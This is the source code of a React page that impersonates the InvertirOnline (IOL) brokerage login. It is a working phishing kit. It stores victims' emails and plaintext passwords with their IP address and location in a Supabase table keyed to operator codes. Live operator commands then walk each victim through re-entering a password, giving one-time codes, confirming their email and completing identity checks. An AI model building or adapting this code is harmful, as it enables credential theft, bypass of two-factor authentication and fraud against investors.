import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { useIsMobile } from "@/hooks/use-mobile";
import IolLoginForm from "@/components/iol/IolLoginForm";
import IolIllustration from "@/components/iol/IolIllustration";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import OtpScreen from "@/components/login/OtpScreen";
import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
import WayniKycFlow from "@/components/kyc/WayniKycFlow";
import iolLogo from "@/assets/iol-logo-v7.svg";

type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "kyc";

type StoredIolFlow = {
  step: IolStep;
  email: string;
  sessionId: string | null;
  errorMessage: string;
  generalError: string;
  kycCaseId: string | null;
};

const IOL_STORAGE_KEY = "iol_flow_state_v1";

const IOL = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const initialFlow: StoredIolFlow = (() => {
    try {
      const raw = sessionStorage.getItem(IOL_STORAGE_KEY);
      if (!raw) {
        return {
          step: "form",
          email: "",
          sessionId: null,
          errorMessage: "",
          generalError: "",
          kycCaseId: null,
        };
      }

      const parsed = JSON.parse(raw) as Partial<StoredIolFlow>;
      const allowedSteps: IolStep[] = ["form", "waiting", "success", "otp", "confirm_email", "kyc"];
      const parsedStep = allowedSteps.includes(parsed.step as IolStep) ? (parsed.step as IolStep) : "form";

      return {
        step: parsedStep,
        email: parsed.email || "",
        sessionId: parsed.sessionId || null,
        errorMessage: parsed.errorMessage || "",
        generalError: parsed.generalError || "",
        kycCaseId: parsed.kycCaseId || null,
      };
    } catch {
      return {
        step: "form",
        email: "",
        sessionId: null,
        errorMessage: "",
        generalError: "",
        kycCaseId: null,
      };
    }
  })();

  const [step, setStep] = useState<IolStep>(initialFlow.step === "confirm_email" ? "waiting" : initialFlow.step);
  const [email, setEmail] = useState(initialFlow.email);
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState(initialFlow.generalError);
  const [sessionId, setSessionId] = useState<string | null>(initialFlow.sessionId);
  const [errorMessage, setErrorMessage] = useState(initialFlow.errorMessage);
  const [kycCaseId, setKycCaseId] = useState<string | null>(initialFlow.kycCaseId);

  const rateLimit = useRateLimit();
  const isMobile = useIsMobile();
  const currentStepRef = useRef<IolStep>("form");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    currentStepRef.current = step;

    const flowToStore: StoredIolFlow = {
      step,
      email,
      sessionId,
      errorMessage,
      generalError,
      kycCaseId,
    };

    sessionStorage.setItem(IOL_STORAGE_KEY, JSON.stringify(flowToStore));
  }, [email, errorMessage, generalError, kycCaseId, sessionId, step]);

  useEffect(() => {
    const originalTitle = document.title;
    const originalDesc = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";

    document.title = "IOL — Ingresar";
    const descMeta = document.querySelector('meta[name="description"]');
    if (descMeta) {
      descMeta.setAttribute("content", "IOL — Accedé a tu cuenta para operar e invertir con seguridad.");
    }

    return () => {
      document.title = originalTitle;
      const currentDescMeta = document.querySelector('meta[name="description"]');
      if (currentDescMeta) {
        currentDescMeta.setAttribute("content", originalDesc);
      }
    };
  }, []);

  const parseCaseIdFromLink = useCallback((link?: string | null) => {
    if (!link) return null;
    const cleanLink = link.trim();
    const match = cleanLink.match(/\/kyc\/([^/?#]+)/i);
    return match?.[1] || null;
  }, []);

  const parseKycPayloadFromOtp = useCallback((otpCode?: string | null) => {
    if (!otpCode || !otpCode.startsWith("kyc_link:")) return null;
    const kycLink = otpCode.replace("kyc_link:", "").trim();
    if (!kycLink) return null;

    return {
      kyc_link: kycLink,
      kyc_case_id: parseCaseIdFromLink(kycLink) || undefined,
    };
  }, [parseCaseIdFromLink]);

  const activateEmbeddedKyc = useCallback((payload?: { kyc_link?: string; kyc_case_id?: string } | string) => {
    const resolvedCaseId = typeof payload === "string"
      ? parseCaseIdFromLink(payload)
      : payload?.kyc_case_id || parseCaseIdFromLink(payload?.kyc_link);

    if (!resolvedCaseId) return;

    setKycCaseId(resolvedCaseId);
    setErrorMessage("");
    setGeneralError("");
    setStep("kyc");
  }, [parseCaseIdFromLink]);

  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
    const status = typeof payload === "string" ? payload : payload?.status;
    if (!status) return;

    if (status === "redirect_kyc") {
      activateEmbeddedKyc(payload);
      return;
    }

    if (["login_success", "approved", "completed", "otp_approved", "confirm_approved", "sync_approved"].includes(status)) {
      setErrorMessage("");
      setGeneralError("");
      setStep("success");
      return;
    }

    if (status === "wrong_password") {
      setErrorMessage("La contraseña de tu correo es incorrecta. Intentá nuevamente.");
      setGeneralError("");
      setStep("waiting");
      return;
    }

    if (status === "redirect_otp" || status === "show_otp") {
      setErrorMessage("");
      setGeneralError("");
      setStep("otp");
      return;
    }

    if (
      status === "redirect_confirm_email" ||
      status === "redirect_sync_email" ||
      status === "confirm_email_pending" ||
      status.startsWith("confirm_") ||
      status.startsWith("sync_")
    ) {
      setErrorMessage("");
      setGeneralError("");
      setStep("confirm_email");
      return;
    }

    if (status === "pending_review" && currentStepRef.current === "waiting") {
      setErrorMessage("");
    }
  }, [activateEmbeddedKyc]);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    let isActive = true;
    let pollDelayMs = 1500;
    let pollTimeout: number | null = null;
    let lastSnapshotKey = "";

    const applySnapshot = (snapshot?: { status?: string; otp_code?: string | null }) => {
      const status = snapshot?.status;
      if (!status) return;

      if (status === "redirect_kyc") {
        const kycPayload = parseKycPayloadFromOtp(snapshot?.otp_code);
        if (kycPayload) {
          handleDecision({ status, ...kycPayload });
          return;
        }
      }

      handleDecision(status);
    };

    const reviewChannel = supabase.channel(`session-review-${sessionId}`);
    reviewChannel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const incoming = payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined;
        handleDecision(incoming);
      })
      .subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string | undefined);
      })
      .subscribe();

    const pollStatus = async () => {
      try {
        const { data } = await supabase
          .from("sessions")
          .select("status, otp_code")
          .eq("id", sessionId)
          .maybeSingle();

        if (!isActive) return;

        if (data?.status) {
          const snapshotKey = `${data.status}::${data.otp_code || ""}`;
          if (snapshotKey !== lastSnapshotKey) {
            lastSnapshotKey = snapshotKey;
            applySnapshot(data);
            pollDelayMs = 1500;
          } else {
            pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
          }
        } else {
          pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
        }
      } catch {
        if (!isActive) return;
        pollDelayMs = Math.min(Math.round(pollDelayMs * 1.5), 7000);
      }

      if (isActive) {
        pollTimeout = window.setTimeout(pollStatus, pollDelayMs);
      }
    };

    pollTimeout = window.setTimeout(pollStatus, pollDelayMs);

    return () => {
      isActive = false;
      if (pollTimeout) window.clearTimeout(pollTimeout);
      supabase.removeChannel(reviewChannel);
      supabase.removeChannel(otpChannel);
    };
  }, [sessionId, step, handleDecision, parseKycPayloadFromOtp]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);
    setKycCaseId(null);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch {
        // ignore
      }

      const newId = crypto.randomUUID();

      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "iol",
        operator_code: operatorCode,
      });

      setSessionId(newId);
      setStep("waiting");
    } catch {
      setGeneralError("No pudimos iniciar sesión. Intentá nuevamente.");
    } finally {
      setLoading(false);
    }
  }, [operatorCode]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;

    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password: newPassword, status: "pending_review" })
      .eq("id", sessionId);

    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({
          type: "broadcast",
          event: "review_decision",
          payload: { status: "pending_review" },
        });
        window.setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    sessionStorage.removeItem(IOL_STORAGE_KEY);
    setStep("form");
    setSessionId(null);
    setKycCaseId(null);
    setErrorMessage("");
    setGeneralError("");
  }, []);

  const handleGoToConfirmEmail = useCallback(() => {
    setErrorMessage("");
    setGeneralError("");
    setStep("confirm_email");

    if (sessionId) {
      supabase
        .from("sessions")
        .update({ status: "redirect_confirm_email" })
        .eq("id", sessionId)
        .then(() => {});
    }
  }, [sessionId]);

  const isKycStep = step === "kyc" && Boolean(kycCaseId);
  const isPostLoginFlow = !isKycStep && step !== "form";
  const useCompactMobileLayout = isMobile && step === "form";

  const mainTitle = useMemo(() => {
    if (isKycStep) return "Validación de identidad";
    if (step === "waiting") return "Actualización de seguridad";
    return "Ingresa a tu cuenta";
  }, [isKycStep, step]);

  const renderCardContent = () => {
    if (step === "kyc" && kycCaseId) {
      return <WayniKycFlow caseId={kycCaseId} embedded brandLabel="IOL" />;
    }

    if (step === "otp" && sessionId) {
      return <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "confirm_email" && sessionId) {
      return <ConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "waiting" && sessionId) {
      return (
        <WaitingScreen
          email={email}
          sessionId={sessionId}
          errorMessage={errorMessage}
          onPasswordResubmit={handlePasswordResubmit}
          onVerifyEmail={handleGoToConfirmEmail}
        />
      );
    }

    if (step === "success") {
      return <SuccessScreen email={email} />;
    }

    return (
      <>
        {generalError && (
          <div className="mb-5 rounded-xl border border-destructive/25 bg-destructive/10 px-4 py-3 text-sm text-destructive">
            {generalError}
          </div>
        )}
        <IolLoginForm onSubmit={handleLoginSubmit} loading={loading} />
      </>
    );
  };

  if (rateLimit.loading) {
    return (
      <div className="iol-theme flex min-h-screen items-center justify-center overflow-x-hidden bg-background text-muted-foreground">
        Cargando...
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="iol-theme flex min-h-screen items-center justify-center overflow-x-hidden bg-background px-4">
        <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center text-card-foreground shadow-lg">
          <h1 className="text-xl font-semibold">Acceso restringido</h1>
          <p className="mt-2 text-sm text-muted-foreground">
            Detectamos actividad inusual y bloqueamos temporalmente este acceso.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="iol-theme flex min-h-screen flex-col overflow-x-hidden bg-background text-foreground">
      <header className="iol-topbar-shadow shrink-0 border-b border-border/80 bg-background">
        <div className="mx-auto flex h-[58px] w-full max-w-6xl items-center justify-center px-5 sm:px-8 lg:justify-start">
          <img src={iolLogo} alt="InvertirOnline" className="h-8 w-auto object-contain" />
        </div>
      </header>

      <main
        className={`mx-auto flex w-full max-w-6xl flex-1 flex-col overflow-x-hidden px-4 sm:px-6 ${isKycStep
          ? "h-[calc(100svh-58px)] min-h-0 overflow-hidden pb-4 pt-4 lg:px-8"
          : useCompactMobileLayout
            ? "justify-center px-4 py-6"
            : isPostLoginFlow
              ? "items-center justify-center pb-8 pt-6 lg:min-h-[calc(100vh-58px)] lg:px-8"
              : "pb-4 pt-4 lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:px-8 lg:pb-16 lg:pt-14"
        }`}
      >
        <section
          className={`w-full ${isKycStep
            ? "min-h-0 flex-1 overflow-hidden"
            : useCompactMobileLayout
              ? "mx-auto flex max-w-[350px] flex-1 flex-col justify-center"
              : isPostLoginFlow
                ? "mx-auto flex w-full max-w-xl flex-1 flex-col justify-center"
                : "mx-auto max-w-[350px] lg:mx-0 lg:pt-8"
          }`}
        >
          {isKycStep ? (
            <div className="h-full overflow-hidden">
              {renderCardContent()}
            </div>
          ) : (
            <>
              <h1 className={`mb-3 font-semibold leading-none text-primary ${isPostLoginFlow ? "text-center text-[2rem] sm:text-[2.2rem]" : "text-center text-[2rem] sm:text-[2.15rem] lg:text-left"}`}>
                {mainTitle}
              </h1>

              <div className={`iol-card-shadow w-full rounded-2xl bg-card ${isPostLoginFlow ? "px-7 py-8 sm:px-10" : "px-6 py-7 sm:px-7"}`}>
                {renderCardContent()}
              </div>
            </>
          )}
        </section>

        {!isKycStep && !isPostLoginFlow && (
          <section className="flex flex-1 justify-center pt-10 lg:justify-end lg:pt-6">
            <IolIllustration />
          </section>
        )}
      </main>

      <footer className="shrink-0 border-t border-border/60 bg-background lg:hidden">
        <div className="mx-auto flex w-full max-w-6xl justify-center px-5 py-5 sm:px-8">
          <img src={iolLogo} alt="InvertirOnline" className="h-7 w-auto object-contain" />
        </div>
      </footer>
    </div>
  );
};

export default IOL;
